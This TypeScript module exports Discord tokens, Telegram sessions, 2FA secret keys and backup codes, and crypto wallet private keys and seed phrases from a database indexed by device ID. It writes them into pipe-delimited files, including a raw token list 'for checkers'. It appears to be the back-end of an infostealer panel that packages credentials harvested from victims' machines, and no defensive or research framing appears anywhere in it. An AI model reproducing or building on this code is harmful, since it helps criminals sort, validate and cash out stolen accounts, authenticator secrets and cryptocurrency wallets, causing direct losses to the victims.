/**
 * Messaging & Token Export Utilities
 *
 * Bulk export for Discord tokens, Telegram sessions, 2FA data, and crypto wallets
 */

import { RowDataPacket } from "mysql2"
import { executeQuery } from "./db"
import { writeFile, mkdir } from "fs/promises"
import { existsSync } from "fs"
import path from "path"

/**
 * Export result interface
 */
export interface ExportResult {
  success: boolean
  file_path?: string
  total_records: number
  error?: string
}

/**
 * Discord token export format
 */
export interface DiscordTokenExport {
  token: string
  token_type: string
  user_id?: string
  email?: string
  source?: string
}

/**
 * Telegram session export format
 */
export interface TelegramSessionExport {
  tdata_path: string
  session_type: string
  has_key_data: boolean
  phone_number?: string
  username?: string
}

/**
 * Export all Discord tokens
 */
export async function exportDiscordTokens(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = `
      SELECT
        token,
        token_type,
        user_id,
        email,
        source_application
      FROM discord_tokens
      WHERE 1=1
    `

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    query += " ORDER BY created_at DESC"

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No Discord tokens found",
      }
    }

    // Format: token|type|user_id|email|source
    const lines = rows.map(
      (row) =>
        `${row.token}|${row.token_type || ""}|${row.user_id || ""}|${row.email || ""}|${row.source_application || ""}`,
    )

    const header = "TOKEN|TYPE|USER_ID|EMAIL|SOURCE"
    const content = [header, ...lines].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export Discord tokens in token-only format (for checkers/validators)
 */
export async function exportDiscordTokensRaw(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = "SELECT DISTINCT token FROM discord_tokens WHERE 1=1"

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No Discord tokens found",
      }
    }

    // One token per line
    const content = rows.map((row) => row.token).join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export Telegram sessions
 */
export async function exportTelegramSessions(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = `
      SELECT
        tdata_path,
        session_type,
        has_key_data,
        has_user_data,
        phone_number,
        username,
        file_count,
        total_size
      FROM telegram_sessions
      WHERE 1=1
    `

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    query += " ORDER BY created_at DESC"

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No Telegram sessions found",
      }
    }

    // Format: tdata_path|type|has_key|phone|username|files|size
    const lines = rows.map(
      (row) =>
        `${row.tdata_path}|${row.session_type}|${row.has_key_data ? "YES" : "NO"}|${row.phone_number || ""}|${row.username || ""}|${row.file_count}|${row.total_size}`,
    )

    const header = "TDATA_PATH|TYPE|HAS_KEY|PHONE|USERNAME|FILES|SIZE"
    const content = [header, ...lines].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export 2FA/Authenticator data
 */
export async function export2FAData(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = `
      SELECT
        app_type,
        service_name,
        account_name,
        secret_key,
        backup_codes
      FROM authenticator_data
      WHERE 1=1
    `

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    query += " ORDER BY created_at DESC"

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No 2FA data found",
      }
    }

    // Format: app|service|account|secret|backup_codes
    const lines = rows.map((row) => {
      const backupCodes = row.backup_codes ? row.backup_codes.replace(/\n/g, ";") : ""
      return `${row.app_type}|${row.service_name || ""}|${row.account_name || ""}|${row.secret_key || ""}|${backupCodes}`
    })

    const header = "APP|SERVICE|ACCOUNT|SECRET|BACKUP_CODES"
    const content = [header, ...lines].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export crypto wallets
 */
export async function exportCryptoWallets(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = `
      SELECT
        wallet_name,
        wallet_type,
        blockchain,
        address,
        private_key,
        seed_phrase
      FROM crypto_wallets
      WHERE 1=1
    `

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    query += " ORDER BY created_at DESC"

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No crypto wallets found",
      }
    }

    // Format: wallet|type|blockchain|address|private_key|seed
    const lines = rows.map(
      (row) =>
        `${row.wallet_name}|${row.wallet_type}|${row.blockchain || ""}|${row.address || ""}|${row.private_key || ""}|${row.seed_phrase || ""}`,
    )

    const header = "WALLET|TYPE|BLOCKCHAIN|ADDRESS|PRIVATE_KEY|SEED_PHRASE"
    const content = [header, ...lines].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export seed phrases only (for wallet recovery)
 */
export async function exportSeedPhrases(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = `
      SELECT
        wallet_name,
        seed_phrase,
        blockchain
      FROM crypto_wallets
      WHERE seed_phrase IS NOT NULL
        AND seed_phrase != ''
    `

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No seed phrases found",
      }
    }

    // Format: wallet|seed|blockchain
    const lines = rows.map(
      (row) => `${row.wallet_name}|${row.seed_phrase}|${row.blockchain || ""}`,
    )

    const header = "WALLET|SEED_PHRASE|BLOCKCHAIN"
    const content = [header, ...lines].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export private keys only
 */
export async function exportPrivateKeys(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    let query = `
      SELECT
        wallet_name,
        private_key,
        blockchain,
        address
      FROM crypto_wallets
      WHERE private_key IS NOT NULL
        AND private_key != ''
    `

    const params: any[] = []

    if (deviceId) {
      query += " AND device_id = ?"
      params.push(deviceId)
    }

    const rows = (await executeQuery(query, params)) as RowDataPacket[]

    if (rows.length === 0) {
      return {
        success: false,
        total_records: 0,
        error: "No private keys found",
      }
    }

    // Format: wallet|private_key|blockchain|address
    const lines = rows.map(
      (row) =>
        `${row.wallet_name}|${row.private_key}|${row.blockchain || ""}|${row.address || ""}`,
    )

    const header = "WALLET|PRIVATE_KEY|BLOCKCHAIN|ADDRESS"
    const content = [header, ...lines].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: rows.length,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export statistics for all messaging/token data
 */
export async function exportMessagingStats(
  outputPath: string,
  deviceId?: string,
): Promise<ExportResult> {
  try {
    const params: any[] = deviceId ? [deviceId, deviceId, deviceId, deviceId] : []

    // Get counts for each category
    const discordQuery = `SELECT COUNT(*) as count FROM discord_tokens ${deviceId ? "WHERE device_id = ?" : ""}`
    const telegramQuery = `SELECT COUNT(*) as count FROM telegram_sessions ${deviceId ? "WHERE device_id = ?" : ""}`
    const authQuery = `SELECT COUNT(*) as count FROM authenticator_data ${deviceId ? "WHERE device_id = ?" : ""}`
    const walletQuery = `SELECT COUNT(*) as count FROM crypto_wallets ${deviceId ? "WHERE device_id = ?" : ""}`

    const [discordRows, telegramRows, authRows, walletRows] = await Promise.all([
      executeQuery(discordQuery, deviceId ? [deviceId] : []) as Promise<RowDataPacket[]>,
      executeQuery(telegramQuery, deviceId ? [deviceId] : []) as Promise<RowDataPacket[]>,
      executeQuery(authQuery, deviceId ? [deviceId] : []) as Promise<RowDataPacket[]>,
      executeQuery(walletQuery, deviceId ? [deviceId] : []) as Promise<RowDataPacket[]>,
    ])

    const stats = {
      discord_tokens: discordRows[0]?.count || 0,
      telegram_sessions: telegramRows[0]?.count || 0,
      authenticator_entries: authRows[0]?.count || 0,
      crypto_wallets: walletRows[0]?.count || 0,
      total: 0,
    }

    stats.total =
      stats.discord_tokens +
      stats.telegram_sessions +
      stats.authenticator_entries +
      stats.crypto_wallets

    // Format output
    const content = [
      "MESSAGING & TOKEN STATISTICS",
      "=" .repeat(50),
      `Discord Tokens: ${stats.discord_tokens}`,
      `Telegram Sessions: ${stats.telegram_sessions}`,
      `2FA/Authenticator: ${stats.authenticator_entries}`,
      `Crypto Wallets: ${stats.crypto_wallets}`,
      `Total Items: ${stats.total}`,
    ].join("\n")

    await writeFile(outputPath, content, "utf-8")

    return {
      success: true,
      file_path: outputPath,
      total_records: stats.total,
    }
  } catch (err) {
    return {
      success: false,
      total_records: 0,
      error: err instanceof Error ? err.message : "Unknown error",
    }
  }
}

/**
 * Export complete messaging package
 * Creates all export files in one directory
 */
export async function exportMessagingPackage(
  outputDir: string,
  deviceId?: string,
): Promise<{
  success: boolean
  files: ExportResult[]
  total_files: number
}> {
  // Create output directory if it doesn't exist
  if (!existsSync(outputDir)) {
    await mkdir(outputDir, { recursive: true })
  }

  const files: ExportResult[] = []

  // Export Discord tokens (detailed)
  const discordResult = await exportDiscordTokens(
    path.join(outputDir, "discord-tokens.txt"),
    deviceId,
  )
  files.push(discordResult)

  // Export Discord tokens (raw format for checkers)
  const discordRawResult = await exportDiscordTokensRaw(
    path.join(outputDir, "discord-tokens-raw.txt"),
    deviceId,
  )
  files.push(discordRawResult)

  // Export Telegram sessions
  const telegramResult = await exportTelegramSessions(
    path.join(outputDir, "telegram-sessions.txt"),
    deviceId,
  )
  files.push(telegramResult)

  // Export 2FA data
  const authResult = await export2FAData(path.join(outputDir, "2fa-data.txt"), deviceId)
  files.push(authResult)

  // Export crypto wallets (all data)
  const walletsResult = await exportCryptoWallets(
    path.join(outputDir, "crypto-wallets.txt"),
    deviceId,
  )
  files.push(walletsResult)

  // Export seed phrases only
  const seedsResult = await exportSeedPhrases(
    path.join(outputDir, "seed-phrases.txt"),
    deviceId,
  )
  files.push(seedsResult)

  // Export private keys only
  const keysResult = await exportPrivateKeys(
    path.join(outputDir, "private-keys.txt"),
    deviceId,
  )
  files.push(keysResult)

  // Export statistics
  const statsResult = await exportMessagingStats(
    path.join(outputDir, "statistics.txt"),
    deviceId,
  )
  files.push(statsResult)

  const successCount = files.filter((f) => f.success).length

  return {
    success: successCount > 0,
    files,
    total_files: files.length,
  }
}
